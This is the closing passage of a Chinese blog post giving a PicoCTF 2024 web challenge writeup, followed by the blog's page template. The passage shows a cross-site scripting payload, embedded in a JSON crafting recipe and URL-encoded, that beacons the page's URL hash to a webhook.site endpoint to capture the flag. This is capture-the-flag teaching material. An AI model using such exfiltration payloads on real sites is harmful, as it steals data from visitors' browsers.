+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;recipe&quot;:[[&quot;Earth&quot;,&quot;Fire&quot;],[&quot;Earth&quot;,&quot;Water&quot;],[&quot;Magma&quot;,&quot;Mud&quot;],[&quot;Earth&quot;,&quot;Obsidian&quot;],[&quot;Obsidian&quot;,&quot;Water&quot;],[&quot;Air&quot;,&quot;Water&quot;],[&quot;Fire&quot;,&quot;Mist&quot;],[&quot;Fog&quot;,&quot;Mud&quot;],[&quot;Hot Spring&quot;,&quot;Sludge&quot;],[&quot;Computer Chip&quot;,&quot;Steam Engine&quot;],[&quot;Computer Chip&quot;,&quot;Fire&quot;],[&quot;Artificial Intelligence&quot;,&quot;Data&quot;],[&quot;Hot Spring&quot;,&quot;Steam Engine&quot;],[&quot;Computer Chip&quot;,&quot;Electricity&quot;],[&quot;Encryption&quot;,&quot;Software&quot;],[&quot;Air&quot;,&quot;Earth&quot;],[&quot;Fire&quot;,&quot;Steam Engine&quot;],[&quot;Dust&quot;,&quot;Heat Engine&quot;],[&quot;Fire&quot;,&quot;Sand&quot;],[&quot;Glass&quot;,&quot;Software&quot;],[&quot;Cybersecurity&quot;,&quot;Vulnerability&quot;],[&quot;Magma&quot;,&quot;Mist&quot;],[&quot;Air&quot;,&quot;Rock&quot;],[&quot;Computer Chip&quot;,&quot;Software&quot;],[&quot;Internet&quot;,&quot;Program&quot;],[&quot;Exploit&quot;,&quot;Web Design&quot;]]&#125;</span><br></pre></td></tr></table></figure>
+<p>然后放xss，这里由于要一个https的网址，所以我选用了webhook:</p>
+<p><a target="_blank" rel="noopener" href="https://webhook.site/">webhook</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;recipe&quot;:[[&quot;Earth&quot;,&quot;Fire&quot;],[&quot;Earth&quot;,&quot;Water&quot;],[&quot;Magma&quot;,&quot;Mud&quot;],[&quot;Earth&quot;,&quot;Obsidian&quot;],[&quot;Obsidian&quot;,&quot;Water&quot;],[&quot;Air&quot;,&quot;Water&quot;],[&quot;Fire&quot;,&quot;Mist&quot;],[&quot;Fog&quot;,&quot;Mud&quot;],[&quot;Hot Spring&quot;,&quot;Sludge&quot;],[&quot;Computer Chip&quot;,&quot;Steam Engine&quot;],[&quot;Computer Chip&quot;,&quot;Fire&quot;],[&quot;Artificial Intelligence&quot;,&quot;Data&quot;],[&quot;Hot Spring&quot;,&quot;Steam Engine&quot;],[&quot;Computer Chip&quot;,&quot;Electricity&quot;],[&quot;Encryption&quot;,&quot;Software&quot;],[&quot;Air&quot;,&quot;Earth&quot;],[&quot;Fire&quot;,&quot;Steam Engine&quot;],[&quot;Dust&quot;,&quot;Heat Engine&quot;],[&quot;Fire&quot;,&quot;Sand&quot;],[&quot;Glass&quot;,&quot;Software&quot;],[&quot;Cybersecurity&quot;,&quot;Vulnerability&quot;],[&quot;Magma&quot;,&quot;Mist&quot;],[&quot;Air&quot;,&quot;Rock&quot;],[&quot;Computer Chip&quot;,&quot;Software&quot;],[&quot;Internet&quot;,&quot;Program&quot;],[&quot;Exploit&quot;,&quot;Web Design&quot;]],&quot;xss&quot;:&quot;new PendingGetBeacon(&#x27;https://webhook.site/a3588472-7e2e-48f9-9ed4-f0518d00be91/?res=&#x27; + window.location.hash.slice(1), &#123;timeout:1000&#125;);&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>打到<code>/remoteCraft?recipe=</code>处：</p>
+<img src="/posts/undefined/18.png" class title="awa">
+<p>这里要urlencode一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remoteCraft?recipe=%7B%22recipe%22%3A%5B%5B%22Earth%22%2C%22Fire%22%5D%2C%5B%22Earth%22%2C%22Water%22%5D%2C%5B%22Magma%22%2C%22Mud%22%5D%2C%5B%22Earth%22%2C%22Obsidian%22%5D%2C%5B%22Obsidian%22%2C%22Water%22%5D%2C%5B%22Air%22%2C%22Water%22%5D%2C%5B%22Fire%22%2C%22Mist%22%5D%2C%5B%22Fog%22%2C%22Mud%22%5D%2C%5B%22Hot%20Spring%22%2C%22Sludge%22%5D%2C%5B%22Computer%20Chip%22%2C%22Steam%20Engine%22%5D%2C%5B%22Computer%20Chip%22%2C%22Fire%22%5D%2C%5B%22Artificial%20Intelligence%22%2C%22Data%22%5D%2C%5B%22Hot%20Spring%22%2C%22Steam%20Engine%22%5D%2C%5B%22Computer%20Chip%22%2C%22Electricity%22%5D%2C%5B%22Encryption%22%2C%22Software%22%5D%2C%5B%22Air%22%2C%22Earth%22%5D%2C%5B%22Fire%22%2C%22Steam%20Engine%22%5D%2C%5B%22Dust%22%2C%22Heat%20Engine%22%5D%2C%5B%22Fire%22%2C%22Sand%22%5D%2C%5B%22Glass%22%2C%22Software%22%5D%2C%5B%22Cybersecurity%22%2C%22Vulnerability%22%5D%2C%5B%22Magma%22%2C%22Mist%22%5D%2C%5B%22Air%22%2C%22Rock%22%5D%2C%5B%22Computer%20Chip%22%2C%22Software%22%5D%2C%5B%22Internet%22%2C%22Program%22%5D%2C%5B%22Exploit%22%2C%22Web%20Design%22%5D%5D%2C%22xss%22%3A%22new%20PendingGetBeacon(&#x27;https%3A%2F%2Fwebhook.site%2Fa3588472-7e2e-48f9-9ed4-f0518d00be91%2F%3Fres%3D&#x27;%20%2B%20window.location.hash.slice(1)%2C%20%7Btimeout%3A1000%7D)%3B%22%7D</span><br></pre></td></tr></table></figure>
+<p>回到webhook已经收到res请求了</p>
+<img src="/posts/undefined/19.png" class title="awa">
+<p>对它base64解码即可出flag</p>
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://example.com/posts/6701.html",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://example.com/posts/6701.html";
+            const title         = "「PicoCTF2024 Web Writeup」";
+            const excerpt       = `清一下存货`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2024-04-01T14:12:21.486Z" itemprop="dateModified">最后编辑：2024-04-01</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" NKCTF2024 Write Up" href="/posts/40439.html">&lt; 上一篇</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+        <div id="v-comments" class="post-comments bg-image"></div>
+<script>
+    var load_comm = () => {
+        const init = () => {
+            new Valine({
+                el: '#v-comments',
+                appId: 'bNjjbBH5XN8401rWT4xZhbCF-gzGzoHsz',
+                appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
+                visitor: true,
+                enableQQ: false,
+                path: '/posts/6701.html'
+                
+            });
+        }
+        if (typeof Valine === 'undefined') {
+            const src = '/vendors/valine@1.4.18/dist/Valine.min.js';
+            $.getScript(src, init);
+        } else {
+            init();
+        }
+    };
+</script>
+
+
+<script>
+<style>
+    .v .veditor{min-height: 10rem;
+        background-image: url(https://cdn.jsdelivr.net/gh/cungudafa/img/images/girls2.png);
+        background-size: contain;
+        background-repeat: no-repeat;
+        background-position: right;
+        background-color: rgba(255,255,255,0);
+        resize: none;}
+</style>
+</script>
+
+
+    <script>
+        new Valine({
+            el: '#vcomments',
+            lang: 'zh-cn',
+            admin_email: '83635877@qq.com',//博主邮箱
+            appId: "",
+            appKey: "",
+            path: window.location.pathname,
+            comment_count: true,
+            //notify: false, // 邮件提醒!使用第三方就不要添加这个!!
+            //verify: true, //验证码
+            avatar: 'monsterid',//小怪物头像
+            placeholder: "qwq~"
+        });
+        
+</script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script type="text/javascript">
+        jinrishici.load(function(result) {
+            var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author;
+            document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
+        })
+    </script>
+
+<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://valine.js.org/">comments powered by Valine.</a></noscript>
+
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+        <script src="./js/src/Valine.min.js"></script>   
+        
+        
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/Oscar.jpg" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                47
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                10
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                11
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF Web</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WriteUp/">CTF WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/">不务正业系列</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a><span class="category-list-count">14</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Java/" style="font-size: 0.6em;">Java</a> <a href="/tags/Misc/" style="font-size: 0.6em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.68em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.68em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.72em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.76em;">基础漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.64em;">渗透</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/posts/6701.html"><i class="fa  fa-book"></i> PicoCTF2024 Web Writeup</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/40439.html"><i class="fa  fa-book"></i> NKCTF2024 Write Up</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/8341.html"><i class="fa  fa-book"></i> VulnStack 3</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/57428.html"><i class="fa  fa-book"></i> VulnStack 2</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/57620.html"><i class="fa  fa-book"></i> VulnStack 1</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        <li><a target="_blank" rel="nofollow" href="https://weibo.com/u/HyDr0genSpectRuM"><i class="fa fa-weibo"></i></a></li>
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://twitter.com/Err0r2333"><i class="fa fa-twitter"></i></a></li>
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/Err0r233"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2024 Err0r233 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Err0r2333.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                        <div id="binft"></div>
+  <script>
+    var binft = function (r) {
+      function t() {
+        return b[Math.floor(Math.random() * b.length)]
+      }  
+      function e() {
+        return String.fromCharCode(94 * Math.random() + 33)
+      }
+      function n(r) {
+        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
+          var l = document.createElement("span");
+          l.textContent = e(), l.style.color = t(), n.appendChild(l)
+        }
+        return n
+      }
+      function i() {
+        var t = o[c.skillI];
+        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
+      }
+      var l = "",
+      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {
+      return r + ""
+      }),
+      a = 2,
+      g = 1,
+      s = 5,
+      d = 75,
+      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
+      c = {
+        text: "",
+        prefixP: -s,
+        skillI: 0,
+        skillP: 0,
+        direction: "forward",
+        delay: a,
+        step: g
+      };
+      i()
+      };
+      binft(document.getElementById('binft'));
+  </script>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="7733928587"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+    <script defer src="/vendors/layui-src@2.5.5/dist/layui.all.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+
+    </body>
+</html>
